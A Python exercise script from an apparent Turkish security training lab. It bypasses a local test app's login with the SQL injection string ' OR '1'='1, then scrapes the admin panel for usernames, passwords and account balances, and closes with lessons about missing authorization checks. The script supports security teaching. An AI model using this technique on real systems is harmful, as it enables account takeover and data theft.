"""
ADIM 2: SQL INJECTION ile Veritabani Bosaltma
===============================================
Zafiyet: SQL injection ile tum veritabanini cekme.
Hedef:  Tum kullanici bilgilerini, sifreleri, bakiyeleri ele gecirme.

Calistirma:  python 02-sql-data-dump.py
"""

import requests

HEDEF = "http://localhost:5000"

print("""
[ADIM 2] SQL Injection - Veritabani Dump
-----------------------------------------""")

s = requests.Session()

# Once giris yap (SQLi ile)
data = {"username": "' OR '1'='1", "password": "x"}
s.post(f"{HEDEF}/", data=data)

# Admin paneline git -> tum bilgiler orada
print("\n[INFO] Admin paneline erisiliyor...")
r = s.get(f"{HEDEF}/admin")

if "KANSER" in r.text:
    print("[OK] Admin paneline erisildi!")

    # Kullanicilari parse et (basit regex)
    import re
    print("\n[VERI] Kullanicilar:")
    print("-" * 60)
    print(f"{'ID':>3} {'Kullanici':15} {'Sifre':15} {'Ad Soyad':20} {'Rol':10}")
    print("-" * 60)

    # Tablodaki satirlari bul
    # users table rows
    matches = re.findall(r'<td>(\d+)</td>\s*<td>(\w+)</td>\s*<td>(\w+)</td>\s*<td>([^<]+)</td>\s*<td[^>]*>(\w+)</td>', r.text)
    for m in matches:
        print(f"{m[0]:>3} {m[1]:15} {m[2]:15} {m[3]:20} {m[4]:10}")

    print("\n[VERI] Hesaplar:")
    print("-" * 60)
    print(f"{'ID':>3} {'User ID':>9} {'Hesap No':20} {'Bakiye':12} {'Tur':10}")
    print("-" * 60)
    acc_matches = re.findall(r'<td>(\d+)</td>\s*<td>(\d+)</td>\s*<td class="hesap-no">(\w+)</td>\s*<td>([\d.]+) TL</td>\s*<td>(\w+)</td>', r.text)
    for m in acc_matches:
        print(f"{m[0]:>3} {m[1]:>9} {m[2]:20} {m[3]:>10} TL {m[4]:10}")

    print("\n[+] Veritabani tamamen ele gecirildi!")
else:
    print("[HATA] Admin paneline erisilemedi")

print("\n" + "="*50)
print("OGRENILENLER:")
print("1. SQL injection ile sadece giris degil, tum veritabani cekilebilir")
print("2. Admin paneli zafiyeti sayesinde butun kullanicilar gorunuyor")
print("3. Zafiyet: Admin sayfasinda yetki kontrolu OLMAMASI")
print("4. Cozum: Her sayfada yetki kontrolu sart")
print("="*50)
